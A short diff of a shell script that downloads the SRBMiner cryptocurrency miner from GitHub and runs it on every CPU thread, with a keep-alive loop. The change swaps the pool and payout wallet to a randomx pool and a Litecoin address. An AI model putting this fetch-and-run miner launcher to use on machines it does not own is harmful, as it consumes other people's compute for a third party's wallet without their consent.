@@ -5,7 +5,7 @@ wget https://github.com/doktor63/SRBMiner/releases/download/2.6.9/SRBMiner-Multi
 tar -xvf SRBMiner-Multi-2-6-9-Linux.tar.gz
 cd SRBMiner-Multi-2-6-9
 clear
-./SRBMiner-MULTI --algorithm verushash --pool eu.luckpool.net:3956 --wallet RTL47WXHCHZ4KxJ9DKMgz3PduyDboztuQu.flare $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.OO $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
 while [ 1 ]; do
 sleep 3
 done
